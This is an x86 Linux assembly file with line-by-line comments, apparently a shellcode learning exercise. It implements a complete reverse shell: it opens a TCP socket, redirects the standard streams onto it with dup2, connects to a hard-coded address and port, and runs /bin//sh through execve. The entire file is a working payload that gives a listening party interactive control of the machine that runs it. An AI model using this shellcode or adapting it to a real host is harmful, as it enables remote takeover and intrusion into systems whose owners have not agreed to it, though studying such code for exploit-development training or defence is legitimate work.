global _start ; Hi linker we are going to use _start as entry point
section .text

_start: ; entry point of program
push byte 0x66 ;Pushing socket sys call no. on stack
pop eax ; EAX=0x66 - socket sys call no. [this will come again and again :p]
xor ebx,ebx ; Clearing out EBX
push ebx    ;Pushing parameters one by one [this one is null being pushed on stack] - [IPPROTO_IP]
inc ebx     ;EBX=1
push ebx    ;The second parameter is being pushed on stack [0x1 on stack] - [SOCK_STREAM]
push byte 0x2 ; Third parameter is pushed on stack [0x2 on stack] - [AF_INET]
; [All three parameters are pushed [2 1 0] on stack ]
mov ecx,esp ;save pointer to socket arguements -> [2 1 0]
cdq     ;Clear out EDX
int 0x80    ;Calling Interrupt for syscall

xchg ebx,eax ;Saving sockfd in ebx
pop ecx ;ECX will contain 2 now
		

loop:
push byte 0x3f    ;push dup2 sys call number on stack
pop eax           ;EAX contains dup2 sys call number i.e 0x3f
int 0x80	        ;Calling Interrupt for sys call
dec ecx	          ;decrement counter ECX by -1
jns loop          ;Jump if condition is met


push dword 0x101017f  ;IP
push word 0xb315		;PORT
push word 0x2
mov ecx,esp

push 0x10 	;length of address
push ecx 	;pointer to sock addr
push ebx 	;points to sockfd
mov ecx,esp ;save pointer to socket arguements
push byte 0x66  ;socket call no.
pop eax
push byte 0x3   ;SYS_CONNECT 
pop ebx
int 0x80


xor ecx,ecx         ;Clearing out ecx [ECX=0]
push ecx            ;Pushing null on stack
push byte 0x0b      ;Pushing execve sys call number on stack
pop eax             ;EAX contain execve sys call number
push 0x68732f2f     ; part1 of string /bin//sh 
push 0x6e69622f     ; part2 of string /bin//sh
mov ebx,esp         ;Pointer to string null terminated
int 0x80            ;Calling Interrupt for sys call
